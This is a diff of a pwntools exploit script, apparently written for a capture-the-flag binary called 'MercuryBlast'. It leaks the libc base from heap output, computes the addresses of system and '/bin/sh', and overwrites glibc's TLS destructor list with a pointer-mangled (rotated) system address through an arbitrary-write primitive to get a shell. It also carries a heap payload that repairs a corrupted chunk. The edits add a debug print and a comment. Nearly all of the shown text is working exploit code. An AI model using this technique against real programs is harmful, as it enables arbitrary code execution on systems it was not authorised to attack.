@@ -31,7 +31,7 @@ def debug(breakpoint=''):
 
 elf = ELF("./MercuryBlast")
 libc = ELF("./libc.so.6")
-context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
+context(arch = elf.arch, os = 'linux')
 
 def add_record(temp, size, data):
     sla("Your choice: ", "1")
@@ -93,11 +93,14 @@ def exp():
     print_record()
     leak = ru('\x7f')
     libc_base = u64(leak[-5:] + b'\x7f\x00\x00') - 0x219ce0
+    print(hex(libc_base))
     sys_addr = libc_base + libc.symbols["system"]
     fake_obj_addr = libc_base + 0x219550
     tls_addr = libc_base - 0x28c0
     tls_dtor_list_addr = tls_addr - 0x58
     bin_sh_addr = libc_base + 0x1d8698
+
+
     io_cookie_read = libc_base + 0x215bf0
     stdout = libc_base + 0x21a780
 
@@ -123,6 +126,8 @@ def exp():
         arw(tls_dtor_list_addr, p64(fake_obj_addr))
         arw(fake_obj_addr, p64(rol(sys_addr, 0x11, 64)))
         arw(fake_obj_addr + 8, p64(bin_sh_addr))
+
+        # restoring the chunk back to "normal"
         payload = b"a" * 0x100 + p64(0) + p64(0x21) + p64(0) + p64(0x1000) + p64(0)
         edit_record(0, "1.1", 0x200, payload)
         sla("Your choice: ", "0")
